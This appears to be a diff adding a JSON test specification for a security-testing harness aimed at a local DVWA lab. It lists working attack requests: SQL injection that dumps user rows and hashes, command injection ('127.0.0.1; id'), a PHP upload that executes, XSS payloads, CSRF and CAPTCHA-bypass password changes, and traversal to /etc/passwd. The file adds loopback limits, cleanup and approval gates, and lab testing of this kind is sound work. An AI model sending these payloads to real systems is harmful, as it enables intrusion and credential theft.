@@ -1,0 +1,181 @@
+{
+  "schema": "sak.blackbox.checks.v1",
+  "target": "dvwa",
+  "profile": "targets/dvwa/blackbox/profile.yaml",
+  "description": "Concrete black-box HTTP/browser sequences for DVWA Low. Evidence and cleanup are per sequence; every expected issue maps to exactly one check.",
+  "variables": {
+    "base_url": {"env": "DVWA_URL", "default": "http://127.0.0.1:8080", "loopback_only": true},
+    "username": {"env": "DVWA_USERNAME", "default": "admin"},
+    "password": {"env": "DVWA_PASSWORD", "default": "password"},
+    "cookie_jar": {"env": "DVWA_COOKIE_JAR", "default": "runs/blackbox-dvwa-<timestamp>/.cookies.txt"},
+    "run_marker": {"pattern": "sak-<target>-<UTC-timestamp>"}
+  },
+  "control": {
+    "login_sequence": "login",
+    "security_sequence": "set-security-low",
+    "csrf": {
+      "source": "/login.php and each state-changing page",
+      "selector": "input[name=\"user_token\"]",
+      "field": "user_token",
+      "rule": "extract immediately before every POST and never reuse across forms"
+    },
+    "session_cookie": "PHPSESSID",
+    "sanitize": ["PHPSESSID", "user_token", "password hashes", "temporary passwords"]
+  },
+  "sequences": {
+    "login": {
+      "actor": "dvwa-admin",
+      "shared": true,
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/login.php", "expect": {"status": 200, "text": "Damn Vulnerable Web Application", "extract": ["user_token"]}},
+        {"n": 2, "action": "POST", "path": "/login.php", "form": {"username": "${username}", "password": "${password}", "user_token": "${user_token}", "Login": "Login"}, "expect": {"status": 302, "location_contains": "index.php", "set_cookie": "PHPSESSID"}},
+        {"n": 3, "action": "GET", "path": "/index.php", "expect": {"status": 200, "text": "Logout"}}
+      ],
+      "expected_evidence": ["login request with the password masked", "Set-Cookie presence", "authenticated index response"],
+      "cleanup": "none"
+    },
+    "set-security-low": {
+      "actor": "dvwa-admin",
+      "shared": true,
+      "preconditions": ["login"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/security.php", "expect": {"status": 200, "text": "Security Level", "extract": ["user_token"]}},
+        {"n": 2, "action": "POST", "path": "/security.php", "form": {"security": "low", "seclev_submit": "Submit", "user_token": "${user_token}"}, "expect": {"status": 200, "text": "Security Level"}},
+        {"n": 3, "action": "GET", "path": "/security.php", "expect": {"selected": "low"}}
+      ],
+      "expected_evidence": ["security page showing low selected"],
+      "cleanup": "none"
+    },
+    "sql-injection": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/sqli/", "params": {"id": "1", "Submit": "Submit"}, "expect": {"status": 200, "text": "SQL Injection"}},
+        {"n": 2, "action": "GET", "path": "/vulnerabilities/sqli/", "params": {"id": "1'", "Submit": "Submit"}, "expect": {"differential": "different body or database error versus step 1"}},
+        {"n": 3, "action": "GET", "path": "/vulnerabilities/sqli/", "params": {"id": "1' UNION SELECT user, password FROM users-- -", "Submit": "Submit"}, "expect": {"regex": "admin"}}
+      ],
+      "expected_evidence": ["step 1 and step 2 bodies", "step 3 returned user rows with hashes masked"],
+      "cleanup": "none"
+    },
+    "command-execution": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/exec/", "expect": {"status": 200, "text": "Command Injection", "extract": ["user_token"]}},
+        {"n": 2, "action": "POST", "path": "/vulnerabilities/exec/", "form": {"ip": "127.0.0.1; id", "Submit": "Submit", "user_token": "${user_token}"}, "expect": {"regex": "uid=.*gid="}},
+        {"n": 3, "action": "POST", "path": "/vulnerabilities/exec/", "form": {"ip": "127.0.0.1; whoami", "Submit": "Submit", "user_token": "${user_token}"}, "expect": {"regex": "www-data|apache|nobody"}}
+      ],
+      "expected_evidence": ["request body", "response containing id output and web user"],
+      "cleanup": "none"
+    },
+    "upload-php-marker": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/upload/", "expect": {"status": 200, "extract": ["user_token"]}},
+        {"n": 2, "action": "MULTIPART", "path": "/vulnerabilities/upload/", "fields": {"Upload": "Upload", "user_token": "${user_token}"}, "file": {"field": "uploaded", "name": "sak-dvwa-<timestamp>.php", "content": "<?php echo 'SAK-UPLOAD-MARKER'; ?>"}, "expect": {"text_any": ["succesfully uploaded", "successfully uploaded"]}},
+        {"n": 3, "action": "GET", "path": "/hackable/uploads/sak-dvwa-<timestamp>.php", "expect": {"status": 200, "text": "SAK-UPLOAD-MARKER"}}
+      ],
+      "expected_evidence": ["upload response", "stored path", "marker execution body"],
+      "cleanup": "Delete only /hackable/uploads/sak-dvwa-<timestamp>.php from the lab container."
+    },
+    "xss-reflected": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/xss_r/", "params": {"name": "<script>alert(document.domain)</script>"}, "expect": {"status": 200, "text": "<script>alert(document.domain)</script>"}},
+        {"n": 2, "action": "BROWSER", "path": "/vulnerabilities/xss_r/", "params": {"name": "<script>alert(document.domain)</script>"}, "expect": {"dialog": "127.0.0.1"}}
+      ],
+      "expected_evidence": ["raw response with unencoded payload", "dialog screenshot or trace"],
+      "cleanup": "none"
+    },
+    "xss-stored": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/xss_s/", "expect": {"status": 200, "extract": ["user_token"]}},
+        {"n": 2, "action": "POST", "path": "/vulnerabilities/xss_s/", "form": {"txtName": "sak-<timestamp>", "mtxMessage": "<script>alert(document.domain)</script>", "btnSign": "Sign Guestbook", "user_token": "${user_token}"}, "expect": {"status": 200, "text": "sak-<timestamp>"}},
+        {"n": 3, "action": "BROWSER", "path": "/vulnerabilities/xss_s/", "context": "fresh", "expect": {"dialog": "127.0.0.1", "dom_contains": "sak-<timestamp>"}}
+      ],
+      "expected_evidence": ["submitted fields", "stored page source", "fresh-context dialog"],
+      "cleanup": "Delete only the guestbook row whose name starts with sak-<timestamp>."
+    },
+    "csrf-password-change": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/csrf/", "params": {"password_new": "sak-temp-<timestamp>", "password_conf": "sak-temp-<timestamp>", "Change": "Change"}, "expect": {"text_any": ["Password Changed", "password changed"]}},
+        {"n": 2, "action": "GET", "path": "/login.php", "expect": {"status": 200}},
+        {"n": 3, "action": "POST", "path": "/login.php", "form": {"username": "${username}", "password": "sak-temp-<timestamp>", "user_token": "${user_token}", "Login": "Login"}, "expect": {"status": 302}},
+        {"n": 4, "action": "GET", "path": "/vulnerabilities/csrf/", "params": {"password_new": "${password}", "password_conf": "${password}", "Change": "Change"}, "expect": {"text_any": ["Password Changed", "password changed"]}}
+      ],
+      "expected_evidence": ["tokenless request", "changed-password response", "temporary login proof", "restore proof"],
+      "cleanup": "Restore the documented lab password and verify a fresh login."
+    },
+    "file-inclusion": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/fi/", "params": {"page": "include.php"}, "expect": {"status": 200, "text": "File Inclusion"}},
+        {"n": 2, "action": "GET", "path": "/vulnerabilities/fi/", "params": {"page": "../../../../etc/passwd"}, "expect": {"regex": "root:x:0:0"}}
+      ],
+      "expected_evidence": ["baseline include body", "traversal body with root:x:0:0"],
+      "cleanup": "none"
+    },
+    "brute-force": {
+      "actor": "anonymous",
+      "default": false,
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/brute/", "params": {"username": "admin", "password": "not-the-password", "Login": "Login"}, "expect": {"text_any": ["Username and/or password incorrect", "incorrect"]}},
+        {"n": 2, "action": "GET", "path": "/vulnerabilities/brute/", "params": {"username": "admin", "password": "${password}", "Login": "Login"}, "expect": {"text": "Welcome to the password protected area"}}
+      ],
+      "expected_evidence": ["request count within cap", "invalid vs valid responses", "no lockout observed"],
+      "cleanup": "none"
+    },
+    "weak-session-id": {
+      "actor": "anonymous",
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/weak_id/", "expect": {"status": 200, "set_cookie": "dvwaSession"}},
+        {"n": 2, "action": "GET", "path": "/vulnerabilities/weak_id/", "expect": {"set_cookie": "dvwaSession"}},
+        {"n": 3, "action": "COMPARE", "left": "step 1 dvwaSession", "right": "step 2 dvwaSession", "expect": {"predictable_increment": true}}
+      ],
+      "expected_evidence": ["ordered cookie values and the increment observation"],
+      "cleanup": "none"
+    },
+    "csp-inline-script": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "GET", "path": "/vulnerabilities/csp/", "expect": {"status": 200, "header": "Content-Security-Policy"}},
+        {"n": 2, "action": "GET", "path": "/vulnerabilities/csp/", "params": {"include": "<script>alert(document.domain)</script>"}, "expect": {"text": "<script>alert(document.domain)</script>"}},
+        {"n": 3, "action": "BROWSER", "path": "/vulnerabilities/csp/", "params": {"include": "<script>alert(document.domain)</script>"}, "expect": {"dialog": "127.0.0.1"}}
+      ],
+      "expected_evidence": ["CSP header", "injected body", "dialog screenshot or trace"],
+      "cleanup": "none"
+    },
+    "captcha-bypass": {
+      "actor": "dvwa-admin",
+      "preconditions": ["login", "set-security-low"],
+      "steps": [
+        {"n": 1, "action": "POST", "path": "/vulnerabilities/captcha/", "form": {"step": "2", "password_new": "sak-temp-<timestamp>", "password_conf": "sak-temp-<timestamp>", "Change": "Change"}, "expect": {"text_any": ["Password Changed", "password changed"]}},
+        {"n": 2, "action": "POST", "path": "/login.php", "form": {"username": "${username}", "password": "sak-temp-<timestamp>", "user_token": "${user_token}", "Login": "Login"}, "expect": {"status": 302}},
+        {"n": 3, "action": "POST", "path": "/vulnerabilities/captcha/", "form": {"step": "2", "password_new": "${password}", "password_conf": "${password}", "Change": "Change"}, "expect": {"text_any": ["Password Changed", "password changed"]}}
+      ],
+      "expected_evidence": ["step sequence showing no fresh challenge", "bypass response", "temporary login proof", "restore proof"],
+      "cleanup": "Restore the documented lab password and verify a fresh login."
+    }
+  },
+  "checks": [
+    {"issue_id": "DVWA-SQLI-01", "sequence": "sql-injection", "kind": "http", "intrusive": false, "approval": "none"},
+    {"issue_id": "DVWA-CMDI-01", "sequence": "command-execution", "kind": "http", "intrusive": true, "approval": "profile"},
+    {"issue_id": "DVWA-UPLOAD-01", "sequence": "upload-php-marker", "kind": "http", "intrusive": true, "approval": "profile"},
+    {"issue_id": "DVWA-XSS-R-01", "sequence": "xss-reflected", "kind": "browser", "intrusive": false, "approval": "none"},
+    {"issue_id": "DVWA-XSS-S-01", "sequence": "xss-stored", "kind": "browser", "intrusive": true, "approval": "profile"},
+    {"issue_id": "DVWA-CSRF-01", "sequence": "csrf-password-change", "kind": "http", "intrusive": true, "approval": "profile"},
+    {"issue_id": "DVWA-FI-01", "sequence": "file-inclusion", "kind": "http", "intrusive": false, "approval": "none"},
+    {"issue_id": "DVWA-BRUTE-01", "sequence": "brute-force", "kind": "http", "intrusive": true, "approval": "owner", "default": false},
+    {"issue_id": "DVWA-SESSION-01", "sequence": "weak-session-id", "kind": "http", "intrusive": false, "approval": "none"},
+    {"issue_id": "DVWA-CSP-01", "sequence": "csp-inline-script", "kind": "browser", "intrusive": false, "approval": "none"},
+    {"issue_id": "DVWA-CAPTCHA-01", "sequence": "captcha-bypass", "kind": "http", "intrusive": true, "approval": "profile"}
+  ]
+}
